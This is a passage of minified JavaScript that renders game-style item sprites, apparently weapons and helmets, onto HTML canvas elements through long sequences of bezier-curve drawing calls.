      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 122, e * 191);
      n.bezierCurveTo(e * 123, e * 237, e * 135, e * 245, e * 153, e * 259);
      n.bezierCurveTo(e * 167, e * 269, e * 158, e * 281, e * 118, e * 276);
      n.bezierCurveTo(e * 104, e * 273, e * 98, e * 268, e * 93, e * 242);
      n.bezierCurveTo(e * 89, e * 220, e * 92, e * 201, e * 102, e * 179);
      n.closePath();
      ye(n, t[3], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 403, e * 182);
      n.bezierCurveTo(e * 414, e * 215, e * 412, e * 232, e * 403, e * 260);
      n.bezierCurveTo(e * 395, e * 274, e * 375, e * 272, e * 356, e * 270);
      n.bezierCurveTo(e * 345, e * 268, e * 339, e * 262, e * 354, e * 252);
      n.bezierCurveTo(e * 370, e * 242, e * 380, e * 225, e * 384, e * 184);
      n.closePath();
      ye(n, t[3], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 155, e * 157);
      n.bezierCurveTo(e * 146, e * 189, e * 137, e * 198, e * 114, e * 219);
      n.bezierCurveTo(e * 104, e * 212, e * 98, e * 203, e * 89, e * 189);
      n.bezierCurveTo(e * 82, e * 178, e * 91, e * 164, e * 93, e * 136);
      n.closePath();
      ye(n, t[4], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 347, e * 162);
      n.bezierCurveTo(e * 357, e * 195, e * 376, e * 209, e * 387, e * 217);
      n.bezierCurveTo(e * 409, e * 201, e * 420, e * 181, e * 416, e * 166);
      n.bezierCurveTo(e * 410, e * 150, e * 412, e * 149, e * 408, e * 130);
      n.closePath();
      ye(n, t[4], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86, e * 134);
      n.bezierCurveTo(e * 79, e * 102, e * 92, e * 84, e * 108, e * 92);
      n.bezierCurveTo(e * 149, e * 108, e * 184, e * 111, e * 242, e * 111);
      n.bezierCurveTo(e * 294, e * 108, e * 341, e * 105, e * 386, e * 98);
      n.bezierCurveTo(e * 412, e * 91, e * 417, e * 86, e * 415, e * 133);
      n.bezierCurveTo(e * 413, e * 160, e * 413, e * 160, e * 368, e * 174);
      n.bezierCurveTo(e * 308, e * 184, e * 291, e * 185, e * 270, e * 186);
      n.bezierCurveTo(e * 264, e * 206, e * 262, e * 215, e * 253, e * 215);
      n.bezierCurveTo(e * 239, e * 217, e * 239, e * 211, e * 231, e * 186);
      n.bezierCurveTo(e * 178, e * 184, e * 156, e * 179, e * 112, e * 162);
      n.bezierCurveTo(e * 87, e * 151, e * 90, e * 144, e * 87, e * 137);
      n.closePath();
      ye(n, t[4], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 63, e * 98);
      n.bezierCurveTo(e * 84, e * 121, e * 109, e * 102, e * 124, e * 117);
      n.bezierCurveTo(e * 138, e * 136, e * 123, e * 165, e * 94, e * 150);
      n.bezierCurveTo(e * 66, e * 131, e * 64, e * 115, e * 63, e * 99);
      n.closePath();
      ye(n, t[3], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 449, e * 97);
      n.bezierCurveTo(e * 446, e * 143, e * 415, e * 151, e * 402, e * 155);
      n.bezierCurveTo(e * 386, e * 157, e * 373, e * 133, e * 391, e * 116);
      n.bezierCurveTo(e * 402, e * 106, e * 432, e * 124, e * 449, e * 97);
      n.closePath();
      ye(n, t[3], t[2], e * 10);
      return r;
    }
    function pt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 304;
      r.height = e * 278;
      n.translate(e * 10, e * 25);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 128, e * 137);
      n.bezierCurveTo(e * 155, e * 144, e * 223, e * 143, e * 256, e * 122);
      n.bezierCurveTo(e * 249, e * 180, e * 210, e * 227, e * 164, e * 242);
      n.bezierCurveTo(e * 74, e * 213, e * 99, e * 166, e * 127, e * 138);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 284, e * 52);
      n.bezierCurveTo(e * 126, e * 112, e * 89, e * 177, e * 170, e * 241);
      n.bezierCurveTo(e * 103, e * 275, e * 20, e * 239, e * 12, e * 159);
      n.bezierCurveTo(e * 5, e * 76, e * 75, e * 4, e * 165, e * 13);
      n.bezierCurveTo(e * 233, e * 15, e * 260, e * 33, e * 284, e * 52);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -10, e * -25);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 128, e * 137);
      n.bezierCurveTo(e * 155, e * 144, e * 223, e * 143, e * 256, e * 122);
      n.bezierCurveTo(e * 249, e * 180, e * 210, e * 227, e * 164, e * 242);
      n.bezierCurveTo(e * 74, e * 213, e * 99, e * 166, e * 127, e * 138);
      n.closePath();
      ye(n, t[1], t[2], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 284, e * 52);
      n.bezierCurveTo(e * 126, e * 112, e * 89, e * 177, e * 170, e * 241);
      n.bezierCurveTo(e * 103, e * 275, e * 20, e * 239, e * 12, e * 159);
      n.bezierCurveTo(e * 5, e * 76, e * 75, e * 4, e * 165, e * 13);
      n.bezierCurveTo(e * 233, e * 15, e * 260, e * 33, e * 284, e * 52);
      n.closePath();
      ye(n, t[3], t[4], e * 15);
      return r;
    }
    function mt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 175;
      r.height = e * 169;
      n.globalAlpha = 0.5;
      n.translate(0, e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 19, e * 139);
      n.bezierCurveTo(e * 18, e * 163, e * 22, e * 156, e * 53, e * 157);
      n.bezierCurveTo(e * 97.5, e * 157, e * 97.5, e * 157, e * 142, e * 157);
      n.bezierCurveTo(e * 150, e * 157, e * 153, e * 156, e * 154, e * 142);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -3);
      n.save();
      n.translate(e * 86.5, e * 81.5);
      Be(n, e * -66.5, e * -65.5, e * 133, e * 131, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.save();
      n.translate(e * 84.5, e * 79);
      Be(n, e * -50.5, e * -49, e * 101, e * 98, e * 10);
      n.restore();
      ye(n, t[3], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42, e * 54);
      n.bezierCurveTo(e * 37, e * 48, e * 39, e * 44, e * 38, e * 41);
      n.bezierCurveTo(e * 42, e * 40, e * 45, e * 40, e * 50, e * 41);
      n.bezierCurveTo(e * 85, e * 36, e * 98, e * 37, e * 116, e * 42);
      n.bezierCurveTo(e * 132, e * 39, e * 132, e * 39, e * 133, e * 56);
      n.bezierCurveTo(e * 136, e * 73, e * 136, e * 84, e * 132, e * 106);
      n.bezierCurveTo(e * 47, e * 113, e * 85.5, e * 106, e * 39, e * 106);
      n.bezierCurveTo(e * 32, e * 81, e * 38, e * 60, e * 42, e * 55);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.save();
      n.translate(e * 28, e * 24);
      n.rotate(0);
      Be(n, e * -14, e * -14, e * 28, e * 28, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.save();
      n.translate(e * 143, e * 23);
      n.rotate(0);
      Be(n, e * -14, e * -14, e * 28, e * 28, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 80);
      n.bezierCurveTo(e * 73, e * 78, e * 84, e * 74, e * 100, e * 64);
      n.bezierCurveTo(e * 111, e * 57, e * 125, e * 67, e * 108, e * 84);
      n.bezierCurveTo(e * 96, e * 95, e * 86, e * 96, e * 70, e * 88);
      n.bezierCurveTo(e * 62.5, e * 84, e * 62.5, e * 84, e * 55, e * 80);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 17, e * 112);
      n.bezierCurveTo(e * 14, e * 146, e * 27, e * 152, e * 37, e * 149);
      n.bezierCurveTo(e * 78, e * 155, e * 128, e * 150, e * 146, e * 150);
      n.bezierCurveTo(e * 158, e * 144, e * 158, e * 121, e * 153, e * 114);
      n.closePath();
      ye(n, t[8], t[9], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 127, e * 111);
      n.bezierCurveTo(e * 133, e * 136, e * 115, e * 149, e * 88, e * 150);
      n.bezierCurveTo(e * 119.5, e * 151, e * 119.5, e * 151, e * 151, e * 152);
      n.bezierCurveTo(e * 159, e * 136, e * 155, e * 126, e * 154, e * 113);
      n.closePath();
      ye(n, t[9]);
      n.globalAlpha = 0.5;
      n.translate(0, e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 15, e * 117);
      n.bezierCurveTo(e * 34, e * 109, e * 61, e * 106, e * 94, e * 109);
      n.bezierCurveTo(e * 126, e * 110, e * 142, e * 113, e * 154, e * 119);
      n.bezierCurveTo(e * 154, e * 123, e * 154, e * 123, e * 154, e * 127);
      n.bezierCurveTo(e * 127, e * 118, e * 15, e * 122, e * 18, e * 129);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 14, e * 127);
      n.bezierCurveTo(e * 13, e * 117, e * 12, e * 109, e * 15, e * 103);
      n.bezierCurveTo(e * 16, e * 95, e * 21, e * 92, e * 60, e * 93);
      n.bezierCurveTo(e * 91, e * 93, e * 118, e * 93, e * 143, e * 96);
      n.bezierCurveTo(e * 151, e * 96, e * 155, e * 99, e * 156, e * 112);
      n.bezierCurveTo(e * 157, e * 124, e * 157, e * 127, e * 156, e * 128);
      n.bezierCurveTo(e * 138, e * 112, e * 100, e * 118, e * 84, e * 118);
      n.bezierCurveTo(e * 28, e * 118, e * 20, e * 120, e * 16, e * 127);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.save();
      n.translate(e * 27.5, e * 138.5);
      Be(n, e * -13.5, e * -14.5, e * 27, e * 29, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.save();
      n.translate(e * 143.5, e * 137);
      Be(n, e * -13.5, e * -14, e * 27, e * 28, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      return r;
    }
    function vt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 175;
      r.height = e * 169;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 17, e * 112);
      n.bezierCurveTo(e * 14, e * 146, e * 27, e * 152, e * 37, e * 149);
      n.bezierCurveTo(e * 78, e * 155, e * 128, e * 150, e * 146, e * 150);
      n.bezierCurveTo(e * 158, e * 144, e * 158, e * 121, e * 153, e * 114);
      n.closePath();
      ye(n, t[8], t[9], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 127, e * 111);
      n.bezierCurveTo(e * 133, e * 136, e * 115, e * 149, e * 88, e * 150);
      n.bezierCurveTo(e * 119.5, e * 151, e * 119.5, e * 151, e * 151, e * 152);
      n.bezierCurveTo(e * 159, e * 136, e * 155, e * 126, e * 154, e * 113);
      n.closePath();
      ye(n, t[9]);
      n.globalAlpha = 0.5;
      n.translate(0, e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 15, e * 117);
      n.bezierCurveTo(e * 34, e * 109, e * 61, e * 106, e * 94, e * 109);
      n.bezierCurveTo(e * 126, e * 110, e * 142, e * 113, e * 154, e * 119);
      n.bezierCurveTo(e * 154, e * 123, e * 154, e * 123, e * 154, e * 127);
      n.bezierCurveTo(e * 127, e * 118, e * 15, e * 122, e * 18, e * 129);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 14, e * 127);
      n.bezierCurveTo(e * 13, e * 117, e * 12, e * 109, e * 15, e * 103);
      n.bezierCurveTo(e * 16, e * 95, e * 21, e * 92, e * 60, e * 93);
      n.bezierCurveTo(e * 91, e * 93, e * 118, e * 93, e * 143, e * 96);
      n.bezierCurveTo(e * 151, e * 96, e * 155, e * 99, e * 156, e * 112);
      n.bezierCurveTo(e * 157, e * 124, e * 157, e * 127, e * 156, e * 128);
      n.bezierCurveTo(e * 138, e * 112, e * 100, e * 118, e * 84, e * 118);
      n.bezierCurveTo(e * 28, e * 118, e * 20, e * 120, e * 16, e * 127);
      n.closePath();
      ye(n, t[4], t[5], e * 5);
      n.save();
      n.translate(e * 27.5, e * 138.5);
      Be(n, e * -13.5, e * -14.5, e * 27, e * 29, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.save();
      n.translate(e * 143.5, e * 137);
      Be(n, e * -13.5, e * -14, e * 27, e * 28, e * 4);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      return r;
    }
    function Mt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 115;
      r.height = e * 585;
      n.scale(-1, 1);
      n.translate(e * -110, 0);
      n.translate(e * 10, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 51.5, e * 342);
      Be(n, e * -14.5, e * -225, e * 29, e * 450, e * 20);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 54, e * 83);
      n.bezierCurveTo(e * 70, e * 69, e * 78, e * 62, e * 82, e * 40);
      n.bezierCurveTo(e * 93, e * 48, e * 103, e * 64, e * 95, e * 102);
      n.bezierCurveTo(e * 60, e * 114, e * 53, e * 103, e * 54, e * 85);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 95, e * 97);
      n.bezierCurveTo(e * 56, e * 102, e * 43, e * 77, e * 71, e * 6);
      n.bezierCurveTo(e * 34, e * 10, e * 6, e * 43, e * 5, e * 76);
      n.bezierCurveTo(e * 4, e * 98, e * 15, e * 130, e * 64, e * 130);
      n.bezierCurveTo(e * 76, e * 129, e * 95, e * 113, e * 97, e * 97);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 176);
      n.bezierCurveTo(e * 74, e * 175, e * 82, e * 169, e * 96, e * 155);
      n.bezierCurveTo(e * 103, e * 183, e * 95, e * 214, e * 54, e * 219);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 50, e * 176);
      n.bezierCurveTo(e * 25, e * 177, e * 16, e * 164, e * 7, e * 156);
      n.bezierCurveTo(e * 0, e * 186, e * 10, e * 201, e * 43, e * 220);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 403);
      n.bezierCurveTo(e * 47, e * 412, e * 58, e * 412, e * 67, e * 403);
      n.bezierCurveTo(e * 66.5, e * 434, e * 66.5, e * 434, e * 66, e * 465);
      n.bezierCurveTo(e * 56, e * 480, e * 40, e * 472, e * 36, e * 465);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59, e * 67);
      n.bezierCurveTo(e * 47, e * 97, e * 18, e * 117, e * 11, e * 110);
      n.bezierCurveTo(e * 11, e * 115, e * 15, e * 122, e * 23, e * 124);
      n.bezierCurveTo(e * 46, e * 118, e * 52, e * 113, e * 62, e * 86);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 125);
      n.bezierCurveTo(e * 47, e * 136, e * 57, e * 134, e * 77, e * 127);
      n.bezierCurveTo(e * 71, e * 158, e * 71, e * 159, e * 66, e * 159);
      n.bezierCurveTo(e * 50.5, e * 156.5, e * 50.5, e * 156.5, e * 35, e * 154);
      n.bezierCurveTo(e * 31, e * 145, e * 31, e * 136, e * 31, e * 125);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 171);
      n.bezierCurveTo(e * 32, e * 221, e * 43, e * 233, e * 70, e * 247);
      n.bezierCurveTo(e * 75, e * 234, e * 75, e * 230, e * 72, e * 221);
      n.bezierCurveTo(e * 48, e * 206, e * 54, e * 188, e * 50, e * 176);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 60, e * 68);
      n.bezierCurveTo(e * 63, e * 69, e * 65, e * 71, e * 67, e * 77);
      n.bezierCurveTo(e * 61, e * 123, e * 52, e * 137, e * 42, e * 150);
      n.bezierCurveTo(e * 38, e * 151, e * 38, e * 151, e * 34, e * 152);
      n.bezierCurveTo(e * 33, e * 146.5, e * 33, e * 146.5, e * 32, e * 141);
      n.bezierCurveTo(e * 49, e * 118, e * 63, e * 87, e * 59, e * 68);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 71, e * 172);
      n.bezierCurveTo(e * 56, e * 222, e * 49, e * 234, e * 35, e * 248);
      n.bezierCurveTo(e * 30, e * 236, e * 30, e * 230, e * 31, e * 217);
      n.bezierCurveTo(e * 44, e * 202, e * 49, e * 191, e * 52, e * 172);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 151);
      n.bezierCurveTo(e * 27, e * 165, e * 31, e * 173, e * 36, e * 178);
      n.bezierCurveTo(e * 56, e * 185, e * 73, e * 184, e * 71, e * 170);
      n.bezierCurveTo(e * 72, e * 154, e * 71, e * 154, e * 63, e * 155);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -10, e * -10);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 51.5, e * 342);
      Be(n, e * -14.5, e * -225, e * 29, e * 450, e * 20);
      n.restore();
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 54, e * 83);
      n.bezierCurveTo(e * 70, e * 69, e * 78, e * 62, e * 82, e * 40);
      n.bezierCurveTo(e * 93, e * 48, e * 103, e * 64, e * 95, e * 102);
      n.bezierCurveTo(e * 60, e * 114, e * 53, e * 103, e * 54, e * 85);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 95, e * 97);
      n.bezierCurveTo(e * 56, e * 102, e * 43, e * 77, e * 71, e * 6);
      n.bezierCurveTo(e * 34, e * 10, e * 6, e * 43, e * 5, e * 76);
      n.bezierCurveTo(e * 4, e * 98, e * 15, e * 130, e * 64, e * 130);
      n.bezierCurveTo(e * 76, e * 129, e * 95, e * 113, e * 97, e * 97);
      n.closePath();
      ye(n, t[5], t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 403);
      n.bezierCurveTo(e * 47, e * 412, e * 58, e * 412, e * 67, e * 403);
      n.bezierCurveTo(e * 66.5, e * 434, e * 66.5, e * 434, e * 66, e * 465);
      n.bezierCurveTo(e * 56, e * 480, e * 40, e * 472, e * 36, e * 465);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 37, e * 427);
      n.bezierCurveTo(e * 47, e * 435, e * 55, e * 435, e * 67, e * 427);
      ye(n, undefined, t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 448);
      n.bezierCurveTo(e * 46, e * 454, e * 54, e * 457, e * 65, e * 449);
      ye(n, undefined, t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 176);
      n.bezierCurveTo(e * 74, e * 175, e * 82, e * 169, e * 96, e * 155);
      n.bezierCurveTo(e * 103, e * 183, e * 95, e * 214, e * 54, e * 219);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 50, e * 176);
      n.bezierCurveTo(e * 25, e * 177, e * 16, e * 164, e * 7, e * 156);
      n.bezierCurveTo(e * 0, e * 186, e * 10, e * 201, e * 43, e * 220);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 59, e * 67);
      n.bezierCurveTo(e * 47, e * 97, e * 18, e * 117, e * 11, e * 110);
      n.bezierCurveTo(e * 11, e * 115, e * 15, e * 122, e * 23, e * 124);
      n.bezierCurveTo(e * 46, e * 118, e * 52, e * 113, e * 62, e * 86);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 125);
      n.bezierCurveTo(e * 47, e * 136, e * 57, e * 134, e * 77, e * 127);
      n.bezierCurveTo(e * 71, e * 158, e * 71, e * 159, e * 66, e * 159);
      n.bezierCurveTo(e * 50.5, e * 156.5, e * 50.5, e * 156.5, e * 35, e * 154);
      n.bezierCurveTo(e * 31, e * 145, e * 31, e * 136, e * 31, e * 125);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 171);
      n.bezierCurveTo(e * 32, e * 221, e * 43, e * 233, e * 70, e * 247);
      n.bezierCurveTo(e * 75, e * 234, e * 75, e * 230, e * 72, e * 221);
      n.bezierCurveTo(e * 48, e * 206, e * 54, e * 188, e * 50, e * 176);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 60, e * 68);
      n.bezierCurveTo(e * 63, e * 69, e * 65, e * 71, e * 67, e * 77);
      n.bezierCurveTo(e * 61, e * 123, e * 52, e * 137, e * 42, e * 150);
      n.bezierCurveTo(e * 38, e * 151, e * 38, e * 151, e * 34, e * 152);
      n.bezierCurveTo(e * 33, e * 146.5, e * 33, e * 146.5, e * 32, e * 141);
      n.bezierCurveTo(e * 49, e * 118, e * 63, e * 87, e * 59, e * 68);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 71, e * 172);
      n.bezierCurveTo(e * 56, e * 222, e * 49, e * 234, e * 35, e * 248);
      n.bezierCurveTo(e * 30, e * 236, e * 30, e * 230, e * 31, e * 217);
      n.bezierCurveTo(e * 44, e * 202, e * 49, e * 191, e * 52, e * 172);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 151);
      n.bezierCurveTo(e * 27, e * 165, e * 31, e * 173, e * 36, e * 178);
      n.bezierCurveTo(e * 56, e * 185, e * 73, e * 184, e * 71, e * 170);
      n.bezierCurveTo(e * 72, e * 154, e * 71, e * 154, e * 63, e * 155);
      n.closePath();
      ye(n, t[7], t[8], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 53, e * 113);
      n.bezierCurveTo(e * 65, e * 140, e * 75, e * 166, e * 52, e * 169);
      n.bezierCurveTo(e * 29, e * 168, e * 41, e * 143, e * 53, e * 112);
      n.closePath();
      ye(n, t[3], t[4], e * 6);
      return r;
    }
    function Lt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 81;
      r.height = e * 626;
      n.translate(e * 20, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 565);
      n.bezierCurveTo(e * 56, e * 586, e * 53, e * 591, e * 40, e * 592);
      n.bezierCurveTo(e * 28, e * 591, e * 27, e * 583, e * 28, e * 557);
      n.bezierCurveTo(e * 27.5, e * 346, e * 27.5, e * 346, e * 27, e * 135);
      n.bezierCurveTo(e * 26, e * 74, e * 36, e * 26, e * 41, e * 15);
      n.bezierCurveTo(e * 54, e * 51, e * 54, e * 81, e * 55, e * 128);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 565);
      n.bezierCurveTo(e * 56, e * 586, e * 53, e * 591, e * 40, e * 592);
      n.bezierCurveTo(e * 28, e * 591, e * 27, e * 583, e * 28, e * 557);
      n.bezierCurveTo(e * 27.5, e * 346, e * 27.5, e * 346, e * 27, e * 135);
      n.bezierCurveTo(e * 26, e * 74, e * 36, e * 26, e * 41, e * 15);
      n.bezierCurveTo(e * 54, e * 51, e * 54, e * 81, e * 55, e * 128);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 129);
      n.bezierCurveTo(e * 32, e * 135, e * 48, e * 136, e * 53, e * 129);
      n.bezierCurveTo(e * 56, e * 97, e * 53, e * 82, e * 52, e * 64);
      n.bezierCurveTo(e * 49, e * 33, e * 44, e * 27, e * 41, e * 21);
      n.bezierCurveTo(e * 31, e * 40, e * 28, e * 84, e * 27, e * 127);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 565);
      n.bezierCurveTo(e * 56, e * 586, e * 53, e * 591, e * 40, e * 592);
      n.bezierCurveTo(e * 28, e * 591, e * 27, e * 583, e * 28, e * 557);
      n.bezierCurveTo(e * 27.5, e * 346, e * 27.5, e * 346, e * 27, e * 135);
      n.bezierCurveTo(e * 26, e * 74, e * 36, e * 26, e * 41, e * 15);
      n.bezierCurveTo(e * 54, e * 51, e * 54, e * 81, e * 55, e * 128);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 475);
      n.bezierCurveTo(e * 38, e * 482, e * 48, e * 480, e * 54, e * 474);
      n.bezierCurveTo(e * 54, e * 509.5, e * 54, e * 509.5, e * 54, e * 545);
      n.bezierCurveTo(e * 46, e * 554, e * 36, e * 552, e * 28, e * 545);
      n.closePath();
      ye(n, t[4], t[5], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 496);
      n.bezierCurveTo(e * 39, e * 506, e * 49, e * 503, e * 54, e * 496);
      ye(n, undefined, t[5], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 521);
      n.bezierCurveTo(e * 41, e * 529, e * 49, e * 524, e * 54, e * 520);
      ye(n, undefined, t[5], e * 8);
      return r;
    }
    function Gt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 100;
      r.height = e * 648;
      n.translate(e * 20, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 50.5, e * 349.5);
      Be(n, e * -13.5, e * -249.5, e * 27, e * 499, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 538);
      n.bezierCurveTo(e * 49.5, e * 538, e * 49.5, e * 538, e * 63, e * 538);
      n.bezierCurveTo(e * 63.5, e * 568, e * 63.5, e * 568, e * 64, e * 598);
      n.bezierCurveTo(e * 50, e * 598, e * 50, e * 598, e * 36, e * 598);
      n.bezierCurveTo(e * 36, e * 568.5, e * 36, e * 568.5, e * 36, e * 539);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 554);
      n.bezierCurveTo(e * 45, e * 561, e * 56, e * 558, e * 63, e * 554);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 569);
      n.bezierCurveTo(e * 44, e * 576, e * 58, e * 574, e * 68, e * 569);
      n.bezierCurveTo(e * 68, e * 584, e * 68, e * 584, e * 68, e * 599);
      n.bezierCurveTo(e * 68, e * 608, e * 65, e * 618, e * 49, e * 617);
      n.bezierCurveTo(e * 34, e * 617, e * 32, e * 610, e * 32, e * 598);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 581);
      n.bezierCurveTo(e * 48, e * 584, e * 55, e * 583, e * 60, e * 581);
